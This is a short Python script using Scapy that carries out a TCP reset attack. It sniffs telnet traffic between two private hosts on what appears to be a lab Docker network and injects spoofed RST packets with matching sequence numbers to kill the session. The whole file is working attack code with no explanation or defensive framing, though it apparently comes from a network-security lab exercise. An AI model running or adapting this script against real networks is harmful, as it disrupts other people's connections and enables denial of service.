#!/bin/env python3

from scapy.all import *
from scapy.layers.inet import TCP


def spoof(pkt):
    pre_ip = pkt[IP]
    pre_tcp = pkt[TCP]

    ip = IP(src=pre_ip.dst, dst=pre_ip.src)
    tcp = TCP(sport=pre_tcp.dport, dport=pre_tcp.sport, flags="R", seq=pre_tcp.ack)

    pkt = ip / tcp
    pkt.show()
    send(pkt, verbose=0)


sniff(iface='br-ec4ac5c9be27', filter='tcp and src host 10.9.0.5 and dst host 10.9.0.6 and dst port 23', prn=spoof)
